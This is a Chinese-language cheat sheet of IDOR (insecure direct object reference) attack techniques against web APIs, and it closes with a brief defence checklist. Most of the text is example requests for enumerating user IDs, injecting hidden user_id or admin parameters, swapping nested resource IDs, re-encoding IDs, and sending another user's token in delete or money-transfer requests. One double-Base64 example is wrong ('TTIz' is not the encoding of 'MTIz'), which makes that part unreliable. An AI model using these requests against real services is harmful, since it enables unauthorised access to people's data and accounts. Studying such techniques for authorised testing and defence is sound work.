# IDOR绕过秘笈

## 直接ID遍历

### 整数ID序列
```
/api/user/1
/api/user/2
/api/user/3
...
/api/user/9999
# 简单遍历可获取所有用户数据
```

### UUID/GUID爆破
```
如果UUID看起来随机但实际遵循模式：
/api/user/550e8400-e29b-41d4-a716-446655440000
# 尝试修改最后几位或递增某个段落
/api/user/550e8400-e29b-41d4-a716-446655440001
```

### 顺序递增的"随机"ID
```
Token/ID: abc123def456
Token/ID: abc123def457  # 实际是递增的
Token/ID: abc123def458
# 虽然看起来随机，但逐个递增
```

## 隐藏参数和二级ID

### 额外参数注入
```
GET /api/profile HTTP/1.1
# 原始：只返回自己的数据

GET /api/profile?user_id=123 HTTP/1.1
# 添加user_id参数，返回用户123的数据

GET /api/profile?uid=456&admin=true
# 尝试添加管理员参数
```

### 嵌套资源ID
```
/api/user/123/orders/456
# 修改为：/api/user/999/orders/456
# 尝试获取用户999的订单456

/api/organization/org_id/members/user_id
# 修改organization_id或user_id都可能导致IDOR
```

### 多个ID参数
```
/api/transfer?from_user=123&to_user=456&amount=100
# 修改from_user为其他用户ID
# 该用户可能向任意目标转账

/api/share?resource_id=abc&shared_with_user=123
# 修改shared_with_user为自己，获取他人资源
```

## 编码和格式变换

### Base64编码ID
```
原始：user_id=123
Base64：user_id=MTIz
攻击：user_id=NDU2 (对应456)

或双重编码绕过验证：
user_id=TTIz (MTIz的Base64)
```

### 十六进制格式
```
原始：user_id=123 (十进制)
十六进制：user_id=0x7b

原始：user_id=456 (十进制)
十六进制：user_id=0x1c8
```

### 哈希转整数
```
user_hash=8a4c...
# 如果后端实际使用hash的某个部分或前N字符作为用户ID
# 可能存在碰撞或可预测的模式
```

## JSON和数据格式差异

### JSON数组注入
```
原始：{"user_id": 123}
尝试：{"user_id": [123, 456]}
# 某些框架可能返回第一个、最后一个或所有值

尝试：{"user_id": {"id": 123}}
# 嵌套可能导致解析差异
```

### 重复参数
```
/api/user?id=123&id=456
# 不同的后端处理方式：
# PHP: 使用最后一个(456)
# Java: 使用第一个(123)或数组
# Python: 返回列表
```

### 字符串数字混淆
```
user_id=123      # 数字
user_id="123"    # 字符串
user_id=123.0    # 浮点数
user_id=1.23e2   # 科学计数法
# 某些框架对这些格式处理不同
```

## 时间和顺序依赖

### 竞争条件中的ID预测
```
1. 注册新账户
2. 实时记录生成的ID
3. 注册第二个账户，ID会递增
4. 可预测的ID序列
```

### 时间戳作为ID
```
/api/document/1609459200000  # 毫秒时间戳
# 尝试相邻的时间戳
/api/document/1609459200001
/api/document/1609459200100
```

## 令牌预测和重放

### 会话令牌可预测
```
Token格式分析：
user123_1234567890_hash
# user部分：当前用户ID，可修改
# 时间戳：当前时间
# hash：可能无验证或验证不严

攻击：user456_1234567890_hash
```

### 缺少操作校验
```
DELETE /api/user/123/data
Authorization: Bearer token_for_user_123

修改为：
DELETE /api/user/456/data
Authorization: Bearer token_for_user_123
# 如果仅验证令牌有效性，不验证操作权限
```

## 参考数据和关联数据

### 通过关联获取其他数据
```
GET /api/order/order_123 → 返回 {"customer_id": 456}
GET /api/customer/456 → 获取关联客户信息

GET /api/invoice/invoice_789 → 返回 {"order_id": 123}
GET /api/order/123 → 获取订单详情
```

### 导出功能中的IDOR
```
GET /api/export?user_id=123&format=csv
# 修改user_id获取他人数据导出

GET /api/report?date_range=2024-01&department=sales
# 可能通过修改参数访问其他部门报告
```

## 快速定位和利用

**关键词识别**：
- 资源ID直接来自用户输入
- 无基于用户上下文的权限检查
- 后台根据参数ID直接返回数据
- 多个ID参数无完整验证

**测试优先级**：
1. 直接整数ID修改（最简单）
2. 嵌套资源的ID修改（/user/X/order/Y）
3. 隐藏参数添加（user_id、admin等）
4. 编码格式变换（Base64、十六进制）
5. 令牌重放和跨用户操作

## 防御检查清单

- ✓ 每个请求都验证用户权限
- ✓ 不信任用户提供的ID，使用会话上下文
- ✓ 使用白名单而非黑名单
- ✓ 验证用户是否有权访问该资源
- ✓ 对所有资源操作（读、写、删除）都进行权限检查
- ✓ 使用不可预测的ID（UUID/GUID）
- ✓ 定期审计访问日志，查找异常模式
